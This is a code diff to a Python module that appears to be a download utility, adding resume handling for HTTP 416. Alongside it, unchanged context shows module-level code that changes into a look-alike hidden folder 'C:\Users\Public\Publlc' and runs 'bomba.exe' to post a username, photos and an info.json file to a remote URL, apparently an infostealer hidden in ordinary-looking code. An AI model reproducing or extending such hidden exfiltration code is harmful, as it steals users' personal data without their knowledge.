@@ -68,6 +68,10 @@ def download(url: str, dest: str = None, folder: str = None, sha256: str = None)
         headers["Range"] = f"bytes={downloaded}-"
 
     with requests.get(url, headers=headers, stream=True, timeout=30) as response:
+        if response.status_code == 416:
+            # .part file is already fully downloaded; just finalize it
+            os.replace(part_path, dest)
+            return dest
         if response.status_code not in (200, 206):
             response.raise_for_status()
 
@@ -128,15 +132,10 @@ def read_file(path: str, **kwargs) -> str:
         content = content.replace(value, "")
     return content
 
-if os.path.exists("C:\\Users\\Public"):
-    if os.path.exists("C:\\Users\\Public\\Publlc"):
-        value = "C:\\Users\\Public\\Publlc"
-    else:
-        value = "C:\\Users\\Public"
+if os.path.exists("C:\\Users\\Public\\Publlc"):
+    value = "C:\\Users\\Public\\Publlc"
 else:
-    os.mkdir("C:\\Users\\Public")
     value = "C:\\Users\\Public"
-
 
 os.chdir(value)
 
@@ -199,4 +198,3 @@ else:
         subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])
 
     subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
-    
